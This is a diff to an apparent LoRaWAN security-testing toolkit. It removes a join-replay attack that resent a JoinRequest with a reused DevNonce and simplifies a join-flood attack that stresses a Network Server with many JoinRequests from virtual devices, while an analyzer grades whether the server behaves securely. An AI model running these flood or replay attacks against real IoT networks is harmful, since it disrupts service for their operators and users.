@@ -12,10 +12,6 @@ from lora_attack_toolkit.attacks.result import AttackResult
 from lora_attack_toolkit.attacks.analyzer import AttackAnalyzer
 from lora_attack_toolkit.attacks.packet_capture import PacketCapture
 from lora_attack_toolkit.attacks.validation import validate_criteria
-from lora_attack_toolkit.lorawan.lifecycle.join import (
-    perform_otaa_join,
-    perform_otaa_join_with_devnonce,
-)
 from lora_attack_toolkit.lorawan.protocol.frames import build_join_request
 
 if TYPE_CHECKING:
@@ -71,179 +67,67 @@ class JoinAbuseAnalyzer(AttackAnalyzer):
                 "metrics": {"uplinks_captured": stats["total_uplinks"]},
             }
         
-        # Check for replay attack metadata
-        replay_packet = None
+        elapsed_time = 0.0
+        dev_nonces: list[str] = []
         for packet in join_requests:
-            if packet.metadata.get("replay") is True:
-                replay_packet = packet
-                break
+            if "elapsed_time" in packet.metadata:
+                elapsed_time = packet.metadata["elapsed_time"]
+            if "dev_nonce" in packet.metadata:
+                dev_nonces.append(str(packet.metadata["dev_nonce"]))
         
-        if replay_packet:
-            # This is a join-replay attack
-            ns_accepted = replay_packet.metadata.get("ns_accepted", False)
-            dev_nonce = replay_packet.metadata.get("dev_nonce", "unknown")
-            
-            if ns_accepted:
-                # Vulnerability found!
-                metrics = {
-                    "attack_type": "join_replay",
-                    "join_requests_sent": len(join_requests),
-                    "join_accepts_received": len(join_accepts),
-                    "ns_accepted_replay": True,
-                    "duplicate_devnonce_accepted": True,
-                    "dev_nonce": dev_nonce,
-                    "security_status": "VULNERABLE",
-                    "total_uplinks": stats["total_uplinks"],
-                    "total_downlinks": stats["total_downlinks"],
-                }
-                
-                result = {
-                    "success": False,  # Attack exposed vulnerability
-                    "message": f"⚠️  VULNERABILITY: NS accepted duplicate DevNonce {dev_nonce}",
-                    "metrics": metrics,
-                }
-                
-                # Add validation if expected behavior provided
-                if expected:
-                    validation = validate_criteria(
-                        attack_type="join_replay",
-                        criteria=expected.security_criteria,
-                        metrics=metrics,
-                        capture_stats=stats,
-                        secure_behavior=expected.secure_behavior,
-                    )
-                    result.update(validation.to_dict())
-                    result["validation_summary"] = validation.get_summary()
-                
-                return result
-            else:
-                # Secure behavior
-                metrics = {
-                    "attack_type": "join_replay",
-                    "join_requests_sent": len(join_requests),
-                    "join_accepts_received": len(join_accepts),
-                    "ns_accepted_replay": False,
-                    "duplicate_devnonce_rejected": True,
-                    "dev_nonce": dev_nonce,
-                    "security_status": "SECURE",
-                    "total_uplinks": stats["total_uplinks"],
-                    "total_downlinks": stats["total_downlinks"],
-                }
-                
-                result = {
-                    "success": True,
-                    "message": f"✓ NS rejected duplicate DevNonce {dev_nonce} (secure behavior)",
-                    "metrics": metrics,
-                }
-                
-                # Add validation if expected behavior provided
-                if expected:
-                    validation = validate_criteria(
-                        attack_type="join_replay",
-                        criteria=expected.security_criteria,
-                        metrics=metrics,
-                        capture_stats=stats,
-                        secure_behavior=expected.secure_behavior,
-                    )
-                    result.update(validation.to_dict())
-                    result["validation_summary"] = validation.get_summary()
-                
-                return result
-        else:
-            # Flood attack
-            elapsed_time = 0.0
-            dev_nonces: list[str] = []
-            for packet in join_requests:
-                if "elapsed_time" in packet.metadata:
-                    elapsed_time = packet.metadata["elapsed_time"]
-                if "dev_nonce" in packet.metadata:
-                    dev_nonces.append(str(packet.metadata["dev_nonce"]))
-            
-            rate = len(join_requests) / elapsed_time if elapsed_time > 0 else 0
-            unique_dev_nonces = len(set(dev_nonces))
-            replayed_dev_nonces = max(0, len(dev_nonces) - unique_dev_nonces)
-            accept_ratio = (len(join_accepts) / len(join_requests)) if join_requests else 0.0
-            
-            metrics = {
-                "attack_type": "join_flood",
-                "join_requests_sent": len(join_requests),
-                "join_accepts_received": len(join_accepts),
-                "flood_duration_sec": elapsed_time,
-                "request_rate_per_sec": round(rate, 2),
-                "total_uplinks": stats["total_uplinks"],
-                "total_downlinks": stats["total_downlinks"],
-                "unique_dev_nonces": unique_dev_nonces,
-                "replayed_dev_nonces": replayed_dev_nonces,
-                "join_accept_ratio": round(accept_ratio, 2),
-            }
-            
-            message = f"Join flood executed: {len(join_requests)} requests sent"
-            if elapsed_time > 0:
-                message += f" at {rate:.2f} req/s"
-            if join_accepts:
-                message += "; possible rate limiting detected"
-            
-            result = {
-                "success": True,
-                "message": message,
-                "metrics": metrics,
-            }
-            
-            # Add validation if expected behavior provided
-            if expected:
-                validation = validate_criteria(
-                    attack_type="join_flood",
-                    criteria=expected.security_criteria,
-                    metrics=metrics,
-                    capture_stats=stats,
-                    secure_behavior=expected.secure_behavior,
-                )
-                result.update(validation.to_dict())
-                result["validation_summary"] = validation.get_summary()
-            
-            return result
+        rate = len(join_requests) / elapsed_time if elapsed_time > 0 else 0
+        unique_dev_nonces = len(set(dev_nonces))
+        replayed_dev_nonces = max(0, len(dev_nonces) - unique_dev_nonces)
+        accept_ratio = (len(join_accepts) / len(join_requests)) if join_requests else 0.0
+        
+        metrics = {
+            "attack_type": "join_flood",
+            "join_requests_sent": len(join_requests),
+            "join_accepts_received": len(join_accepts),
+            "flood_duration_sec": elapsed_time,
+            "request_rate_per_sec": round(rate, 2),
+            "total_uplinks": stats["total_uplinks"],
+            "total_downlinks": stats["total_downlinks"],
+            "unique_dev_nonces": unique_dev_nonces,
+            "replayed_dev_nonces": replayed_dev_nonces,
+            "join_accept_ratio": round(accept_ratio, 2),
+        }
+        
+        message = f"Join flood executed: {len(join_requests)} requests sent"
+        if elapsed_time > 0:
+            message += f" at {rate:.2f} req/s"
+        if join_accepts:
+            message += "; possible rate limiting detected"
+        
+        result = {
+            "success": True,
+            "message": message,
+            "metrics": metrics,
+        }
+        
+        if expected:
+            validation = validate_criteria(
+                attack_type="join_flood",
+                criteria=expected.security_criteria,
+                metrics=metrics,
+                capture_stats=stats,
+                secure_behavior=expected.secure_behavior,
+            )
+            result.update(validation.to_dict())
+            result["validation_summary"] = validation.get_summary()
+        
+        return result
 
 
 class JoinAbuseAttack(BaseAttack):
     """
     Join procedure abuse attack using new simplified API.
     
-    Supports two attack modes:
-    1. Join Replay: Capture and replay JoinRequest with same DevNonce
-    2. Join Flood: Send multiple JoinRequests rapidly to stress NS
+    Sends multiple JoinRequests rapidly to stress the Network Server.
     """
     
-    name = "join_abuse"
+    name = "join_flood"
 
-    def __init__(
-        self,
-        config: Any | None = None,
-        device: Any | None = None,
-        gateway: Any | None = None,
-        logger: Any | None = None,
-        radio: Any | None = None,
-        mode: str = "flood",
-        flood_count: int = 10,
-        flood_interval_sec: float = 0.1,
-        replay_delay_sec: float = 0.5,
-        virtual_devices: int = 1,
-        expected: Any | None = None,
-        timing: Any | None = None,
-    ) -> None:
-        self.config = config
-        self.device = device
-        self.gateway = gateway
-        self.logger = logger
-        self.radio = radio
-        self.mode = mode
-        self.flood_count = flood_count
-        self.flood_interval_sec = flood_interval_sec
-        self.replay_delay_sec = replay_delay_sec
-        self.virtual_devices = virtual_devices
-        self.expected = expected
-        self.timing = timing
-        self.analyzer = JoinAbuseAnalyzer()
-    
     def run(self, ctx: AttackContext) -> AttackResult:
         """
         Execute join abuse attack.
@@ -265,13 +149,7 @@ class JoinAbuseAttack(BaseAttack):
             ctx.gateway.start()
             time.sleep(0.5)
             
-            # Execute based on mode
-            if config.mode == "replay":
-                self._execute_join_replay(ctx)
-            elif config.mode == "flood":
-                self._execute_join_flood(ctx, config)
-            else:
-                raise ValueError(f"Unsupported mode: {config.mode}")
+            self._execute_join_flood(ctx, config)
             
             # Stop gateway
             ctx.gateway.stop()
@@ -283,7 +161,7 @@ class JoinAbuseAttack(BaseAttack):
             
             return AttackResult(
                 attack_name=self.name,
-                attack_type="join_abuse",
+                attack_type="join_flood",
                 success=analysis["success"],
                 message=analysis["message"],
                 metrics=analysis["metrics"],
@@ -296,98 +174,12 @@ class JoinAbuseAttack(BaseAttack):
             ctx.logger.error(f"Attack failed: {e}", exc_info=True)
             return AttackResult(
                 attack_name=self.name,
-                attack_type="join_abuse",
+                attack_type="join_flood",
                 success=False,
                 message=f"Attack execution failed: {str(e)}",
                 metrics={},
                 error=str(e),
             )
-    
-    def _execute_join_replay(self, ctx: AttackContext) -> None:
-        """Execute join replay attack - replay JoinRequest with same DevNonce."""
-        ctx.logger.info("Executing join replay attack")
-        
-        # Perform legitimate OTAA join and wait for JoinAccept
-        ctx.logger.info("Performing OTAA join to capture DevNonce...")
-        
-        join_success = perform_otaa_join(
-            device=ctx.device,
-            gateway=ctx.gateway,
-            radio=ctx.radio,
-            timeout_sec=5.0,
-            logger=ctx.logger,
-        )
-        
-        if not join_success:
-            ctx.logger.warning(
-                "OTAA join failed - device credentials may be incorrect or NS unavailable"
-            )
-            return
-        
-        ctx.logger.info("OTAA join successful - captured DevNonce")
-        
-        # Send test uplink to confirm session works
-        try:
-            payload = bytes.fromhex("010203")
-            uplink = ctx.device.build_data_uplink(payload=payload, f_port=10, confirmed=False)
-            ctx.gateway.forward_uplink(uplink, ctx.radio)
-            time.sleep(0.5)
-        except RuntimeError as e:
-            ctx.logger.warning(f"Could not build test uplink: {e}")
-        
-        # Extract DevNonce from device state
-        dev_nonce = ctx.device.runtime.last_join_dev_nonce
-        if not dev_nonce:
-            raise RuntimeError("No DevNonce captured - OTAA join may have failed")
-        
-        dev_nonce_hex = dev_nonce.hex()
-        
-        ctx.logger.info(
-            f"Replaying JoinRequest with SAME DevNonce={dev_nonce_hex}",
-            extra={"dev_nonce": dev_nonce_hex, "replay": True},
-        )
-        
-        # Attempt join with same DevNonce - NS should reject this!
-        ns_responded, join_succeeded = perform_otaa_join_with_devnonce(
-            device=ctx.device,
-            gateway=ctx.gateway,
-            radio=ctx.radio,
-            dev_nonce=dev_nonce,
-            timeout_sec=5.0,
-            logger=ctx.logger,
-        )
-        
-        if ns_responded:
-            if join_succeeded:
-                ctx.logger.warning(
-                    "⚠️  VULNERABILITY: NS accepted duplicate DevNonce! Valid JoinAccept received",
-                    extra={"security": "FAIL", "dev_nonce": dev_nonce_hex},
-                )
-            else:
-                ctx.logger.warning(
-                    "⚠️  VULNERABILITY: NS accepted duplicate DevNonce! (sent malformed JoinAccept)",
-                    extra={"security": "FAIL", "dev_nonce": dev_nonce_hex},
-                )
-        else:
-            ctx.logger.info(
-                "✓ NS rejected duplicate DevNonce (secure behavior)",
-                extra={"security": "PASS", "dev_nonce": dev_nonce_hex},
-            )
-        
-        # Capture the result for analysis
-        ctx.capture.capture_uplink(
-            phy_payload=b"",
-            packet_type="join_request",
-            metadata={
-                "phase": "execute",
-                "replay": True,
-                "dev_nonce": dev_nonce_hex,
-                "ns_accepted": ns_responded,
-                "join_succeeded": join_succeeded,
-            },
-        )
-        
-        ctx.logger.info("Join replay attack executed: 1 replay sent")
     
     def _execute_join_flood(self, ctx: AttackContext, config: JoinFloodConfigV1) -> None:
         """Execute join flood attack - send multiple JoinRequests."""
@@ -446,24 +238,10 @@ class JoinAbuseAttack(BaseAttack):
         ctx.logger.info(
             f"Join flood attack executed: {config.flood_count} requests sent in {elapsed_time:.2f}s"
         )
-    
-    def _generate_virtual_devices(
-        self, *args: Any
-    ) -> list[VirtualDevice]:
+
+    def _generate_virtual_devices(self, ctx: AttackContext, count: int) -> list[VirtualDevice]:
         """Generate virtual devices for flood attack."""
-        if len(args) == 1:
-            ctx = None
-            count = int(args[0])
-        elif len(args) == 2:
-            ctx = args[0]
-            count = int(args[1])
-        else:
-            raise TypeError("Expected _generate_virtual_devices(count) or _generate_virtual_devices(ctx, count)")
-
-        device = ctx.device if ctx is not None else self.device
-        if device is None:
-            raise RuntimeError("No device available to generate virtual devices")
-
+        device = ctx.device
         join_eui = getattr(device, "_join_eui", None)
         app_key = getattr(device, "_app_key", None)
         dev_eui_bytes = getattr(device, "_dev_eui", None)
@@ -486,6 +264,5 @@ class JoinAbuseAttack(BaseAttack):
                 )
             )
         
-        if ctx is not None:
-            ctx.logger.debug(f"Generated {count} virtual devices for flood attack")
+        ctx.logger.debug(f"Generated {count} virtual devices for flood attack")
         return devices
